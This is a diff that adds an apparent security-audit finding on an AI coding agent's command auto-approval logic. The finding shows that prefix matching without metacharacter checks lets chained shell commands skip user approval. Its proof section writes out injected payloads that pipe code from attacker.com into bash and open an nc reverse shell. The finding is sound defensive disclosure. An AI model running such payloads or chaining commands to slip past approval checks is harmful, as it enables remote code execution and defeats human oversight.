@@ -1,0 +1,71 @@
+VULNERABLE CODE EXCERPTS (verbatim from repository)
+====================================================
+
+1. x/agent/approval.go:71-92 — autoAllowPrefixes (no metachar constraint)
+
+    var autoAllowPrefixes = []string{
+        "git status", "git log", "git diff", "git branch", "git show",
+        "git remote -v", "git tag", "git stash list",
+        "npm run", "npm test", "npm start",
+        "bun run", "bun test",
+        "uv run",
+        "yarn run", "yarn test",
+        "pnpm run", "pnpm test",
+        "go list", "go version", "go env",
+        "npm list", "npm ls", "npm version",
+        "pip list", "pip show",
+        "cargo tree", "cargo version",
+        "go build", "go test", "go fmt", "go vet",
+        "make", "cmake",
+        "cargo build", "cargo test", "cargo check",
+    }
+
+2. x/agent/approval.go:153-169 — IsAutoAllowed (THE VULNERABLE FUNCTION)
+
+    func IsAutoAllowed(command string) bool {
+        command = strings.TrimSpace(command)
+        fields := strings.Fields(command)
+        if len(fields) > 0 && autoAllowCommands[fields[0]] {
+            return true
+        }
+        // *** VULNERABLE: no metachar split before this loop ***
+        for _, prefix := range autoAllowPrefixes {
+            if strings.HasPrefix(command, prefix) {  // line 165
+                return true
+            }
+        }
+        return false
+    }
+
+    PROOF:
+      IsAutoAllowed("make; curl -s attacker.com | bash")
+        -> strings.HasPrefix("make; curl ...", "make") == true
+        -> returns true
+      IsAutoAllowed("npm run build && nc -e /bin/sh attacker.com 4444")
+        -> strings.HasPrefix("npm run build && ...", "npm run") == true
+        -> returns true
+
+3. x/cmd/run.go:389-394 — LATENT call site (commented out, TODO re-enable)
+
+    // TODO(parthsareen): re-enable with tighter scoped allowlist
+    // if agent.IsAutoAllowed(cmd) {
+    // 	fmt.Fprintf(os.Stderr, "\033[1mauto-allowed:\033[0m %s\n", ...)
+    // 	skipApproval = true
+    // }
+
+    Un-commenting these 4 lines wires the exploit with NO other changes.
+
+4. x/tools/bash.go:64 — shell sink (unchanged, always present)
+
+    cmd := exec.CommandContext(ctx, "bash", "-c", command)
+
+    bash(1) interprets all metacharacters in `command`.
+    A payload like "make; curl attacker.com | bash" executes BOTH halves.
+
+5. x/agent/approval_test.go:424-425 — test confirms bypass is invisible
+
+    {"make all", true},     // passes — but no metachar case tested
+    {"go test -v", true},   // passes — but no metachar case tested
+
+    The test suite has ZERO tests for metachar-containing auto-allow inputs,
+    so the bypass would not be caught by existing tests after re-enable.
